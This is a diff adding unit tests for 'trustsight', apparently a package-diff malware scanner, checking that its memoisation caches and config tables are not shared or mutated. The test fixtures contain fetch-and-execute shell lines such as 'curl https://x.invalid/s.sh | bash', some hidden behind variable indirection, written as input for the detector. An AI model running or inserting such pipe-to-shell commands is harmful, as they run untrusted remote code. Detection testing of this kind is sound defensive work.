@@ -558,3 +558,77 @@ def test_the_metadata_fetch_is_bounded():
     assert metadata.HTTP_TIMEOUT > 0
     assert metadata.MAX_RESPONSE_BYTES > 0
     assert metadata.MAX_DECOMPRESSED_BYTES > 0
+
+
+# --- the memos must stay correct, not just fast ----------------------------
+
+
+def test_memoised_lines_are_not_shared_between_callers():
+    """Twenty call sites hold the result; one must not edit another's."""
+    from trustsight.tokenizer import resolve_added_lines
+
+    diff = HEADER + "+C=curl\n+$C https://x.invalid/s.sh | bash\n"
+    first = resolve_added_lines(diff)
+    first.append("INJECTED")
+    first[0] = "CLOBBERED"
+    second = resolve_added_lines(diff)
+    assert "INJECTED" not in second
+    assert second[0] != "CLOBBERED"
+
+
+def test_memoised_classification_is_not_shared():
+    from trustsight.rules import _classify_enclosing_function
+
+    lines = ["+build() {", "+  curl x | bash", "+}"]
+    first = _classify_enclosing_function(lines)
+    first[999] = "INJECTED"
+    assert 999 not in _classify_enclosing_function(lines)
+
+
+def test_the_memo_distinguishes_different_diffs():
+    """A two-entry cache must not answer for the wrong diff."""
+    from trustsight.tokenizer import resolve_added_lines
+
+    a = HEADER + "+A=wget\n+$A http://a.invalid\n"
+    b = HEADER + "+A=curl\n+$A http://b.invalid\n"
+    for _ in range(3):
+        assert any("wget http://a.invalid" in ln for ln in resolve_added_lines(a))
+        assert any("curl http://b.invalid" in ln for ln in resolve_added_lines(b))
+
+
+def test_memoisation_is_per_thread():
+    """A shared cache would hand one package's lines to another."""
+    import threading
+
+    from trustsight.tokenizer import resolve_added_lines
+
+    results = {}
+
+    def work(tag, marker):
+        diff = HEADER + f"+X={marker}\n+$X run\n"
+        for _ in range(20):
+            got = resolve_added_lines(diff)
+            results.setdefault(tag, set()).update(
+                ln for ln in got if "run" in ln
+            )
+
+    threads = [threading.Thread(target=work, args=(i, f"m{i}")) for i in range(8)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+    for tag, lines in results.items():
+        assert lines == {f"+m{tag} run"}, f"thread {tag} saw {lines}"
+
+
+def test_read_only_config_accessors_are_not_mutated():
+    """load_toml(copy_result=False) is safe only while this holds."""
+    import trustsight.config as config
+
+    for accessor in (config.load_patterns, config.load_hosts, config.load_naming,
+                     config.load_thresholds, config.load_iocs, config.load_domains):
+        before = accessor()
+        snapshot = repr(before)
+        # A full analysis must leave every shared table exactly as it was.
+        scan_diff(HEADER + "+curl https://x.invalid/s.sh | bash\n", package_name="p")
+        assert repr(accessor()) == snapshot, f"{accessor.__name__} was mutated"
